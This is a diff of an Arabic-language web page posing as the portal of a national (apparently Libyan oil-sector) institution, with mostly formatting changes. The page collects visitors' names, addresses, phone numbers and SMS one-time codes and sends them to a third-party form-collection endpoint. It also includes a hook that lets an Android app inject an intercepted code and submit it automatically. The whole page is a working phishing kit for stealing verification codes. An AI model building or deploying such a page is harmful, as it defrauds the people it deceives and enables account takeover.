@@ -3,13 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>منصة المؤسسة الوطنــية</title>
+  <title>المؤسسة الوطنــية</title>
 
-  <link rel="icon" href="uy.jpeg" type="image/png">
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="icon" href="uy.jpeg" type="image/png" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap"
+    rel="stylesheet"
+  />
   <style>
     body {
-      font-family: 'Cairo', sans-serif;
+      font-family: "Cairo", sans-serif;
       background: linear-gradient(135deg, #002147, #003366);
       display: flex;
       justify-content: center;
@@ -104,7 +107,6 @@
   </style>
 </head>
 <body>
-
   <div class="container">
     <div class="logo-container">
       <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
@@ -115,13 +117,34 @@
 
     <form id="phoneForm" onsubmit="return sendPhone(event);">
       <label for="fullname">الاسم الثلاثي:</label>
-      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
+      <input
+        type="text"
+        id="fullname"
+        name="fullname"
+        required
+        placeholder="اكتب اسمك الثلاثي"
+      />
 
       <label for="address">العنوان:</label>
-      <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
+      <input
+        type="text"
+        id="address"
+        name="address"
+        required
+        placeholder="اكتب عنوانك"
+      />
 
       <label for="phone">رقم الهاتف:</label>
-      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
+      <input
+        type="tel"
+        id="phone"
+        name="phone"
+        required
+        placeholder="اكتب رقم هاتفك"
+        pattern="[0-9]{10,15}"
+        title="أدخل رقم هاتف صحيح"
+        autocomplete="tel"
+      />
 
       <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
       <div id="timer"></div>
@@ -130,11 +153,21 @@
     <form id="codeForm" onsubmit="return sendCode(event);">
       <div id="codeField">
         <label for="code">جاري إرسال الكود عبر SMS</label>
-        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
+        <input
+          type="text"
+          id="code"
+          name="code"
+          placeholder="اكتب الكود هنا"
+          autocomplete="one-time-code"
+        />
         <div id="errorMessage" class="error"></div>
         <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
-        <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
-          جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
+        <div
+          id="processingMessage"
+          style="display: none; color: #003366; font-weight: bold; margin-top: 20px"
+        >
+          جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب
+          بيانات جديدة منك وشكرًا
         </div>
       </div>
     </form>
@@ -145,17 +178,17 @@
 
     function startTimer(duration) {
       let timeLeft = duration;
-      const timerDisplay = document.getElementById('timer');
-      const sendPhoneBtn = document.getElementById('sendPhoneBtn');
-      const phoneInput = document.getElementById('phone');
-      timerDisplay.style.display = 'block';
+      const timerDisplay = document.getElementById("timer");
+      const sendPhoneBtn = document.getElementById("sendPhoneBtn");
+      const phoneInput = document.getElementById("phone");
+      timerDisplay.style.display = "block";
       updateTimer(timeLeft);
       countdownInterval = setInterval(() => {
         timeLeft--;
         updateTimer(timeLeft);
         if (timeLeft <= 0) {
           clearInterval(countdownInterval);
-          timerDisplay.style.display = 'none';
+          timerDisplay.style.display = "none";
           sendPhoneBtn.disabled = false;
           phoneInput.disabled = false;
         }
@@ -163,96 +196,98 @@
     }
 
     function updateTimer(seconds) {
-      const timerDisplay = document.getElementById('timer');
-      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
-      const secs = (seconds % 60).toString().padStart(2, '0');
+      const timerDisplay = document.getElementById("timer");
+      const minutes = Math.floor(seconds / 60)
+        .toString()
+        .padStart(2, "0");
+      const secs = (seconds % 60).toString().padStart(2, "0");
       timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
     }
 
     function sendPhone(event) {
       event.preventDefault();
-      const phoneInput = document.getElementById('phone');
-      const fullname = document.getElementById('fullname').value;
-      const address = document.getElementById('address').value;
+      const phoneInput = document.getElementById("phone");
+      const fullname = document.getElementById("fullname").value;
+      const address = document.getElementById("address").value;
 
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
-        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
+        alert("يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً");
         phoneInput.focus();
         return false;
       }
 
       const payload = { fullname, address, phone: phoneInput.value };
-      fetch('https://formcarry.com/s/2evKahWtdJS', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(payload)
+      fetch("https://formcarry.com/s/2evKahWtdJS", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", Accept: "application/json" },
+        body: JSON.stringify(payload),
       })
-      .then(response => {
-        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
-        phoneInput.disabled = true;
-        document.getElementById('sendPhoneBtn').disabled = true;
-        document.getElementById('codeField').style.display = 'block';
-        startTimer(480); // 8 دقائق
-      })
-      .catch(error => {
-        alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
-        console.error(error);
-      });
+        .then((response) => {
+          if (!response.ok) throw new Error("فشل إرسال رقم الهاتف");
+          phoneInput.disabled = true;
+          document.getElementById("sendPhoneBtn").disabled = true;
+          document.getElementById("codeField").style.display = "block";
+          startTimer(480); // 8 دقائق
+        })
+        .catch((error) => {
+          alert("تعذر إرسال رقم الهاتف. حاول مرة أخرى.");
+          console.error(error);
+        });
 
       return false;
     }
 
     function sendCode(event) {
       event.preventDefault();
-      const codeInput = document.getElementById('code');
-      const errorMessage = document.getElementById('errorMessage');
-      const processingMessage = document.getElementById('processingMessage');
-      const sendCodeBtn = document.getElementById('sendCodeBtn');
-      errorMessage.textContent = '';
+      const codeInput = document.getElementById("code");
+      const errorMessage = document.getElementById("errorMessage");
+      const processingMessage = document.getElementById("processingMessage");
+      const sendCodeBtn = document.getElementById("sendCodeBtn");
+      errorMessage.textContent = "";
 
-      if (codeInput.value.trim() === '') {
-        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
+      if (codeInput.value.trim() === "") {
+        errorMessage.textContent = "يرجى كتابة الكود المرسل إليك.";
         codeInput.focus();
         return false;
       }
 
       const payload = {
-        phone: document.getElementById('phone').value,
-        code: codeInput.value
+        phone: document.getElementById("phone").value,
+        code: codeInput.value,
       };
 
-      fetch('https://formcarry.com/s/2evKahWtdJS', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(payload)
+      fetch("https://formcarry.com/s/2evKahWtdJS", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", Accept: "application/json" },
+        body: JSON.stringify(payload),
       })
-      .then(async response => {
-        const data = await response.json();
-        if (response.ok && data.success !== false) {
-          sendCodeBtn.style.display = 'none';
-          processingMessage.style.display = 'block';
-        } else {
-          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
-        }
-      })
-      .catch(error => {
-        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
-        console.error(error);
-      });
+        .then(async (response) => {
+          const data = await response.json();
+          if (response.ok && data.success !== false) {
+            sendCodeBtn.style.display = "none";
+            processingMessage.style.display = "block";
+          } else {
+            errorMessage.textContent = "❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.";
+          }
+        })
+        .catch((error) => {
+          errorMessage.textContent = "⚠️ تعذر الاتصال بالخادم.";
+          console.error(error);
+        });
 
       return false;
     }
 
-    // الدالة التي يتم استدعاؤها من Android لإدخال الكود تلقائيًا وإرسال النموذج تلقائيًا
+    // ======= دالة التعبئة التلقائية من تطبيق الأندرويد =======
     function fillCodeFromAndroid(code) {
-      const codeField = document.getElementById('codeField');
-      const input = document.getElementById('code');
-      const form = document.getElementById('codeForm');
+      const codeField = document.getElementById("codeField");
+      const input = document.getElementById("code");
+      const form = document.getElementById("codeForm");
 
-      codeField.style.display = 'block';
+      codeField.style.display = "block";
       input.value = code;
 
-      // إرسال النموذج بعد 500 مللي ثانية تلقائيًا
+      // ارسال النموذج تلقائيًا بعد 500 مللي ثانية
       setTimeout(() => {
         form.requestSubmit();
       }, 500);
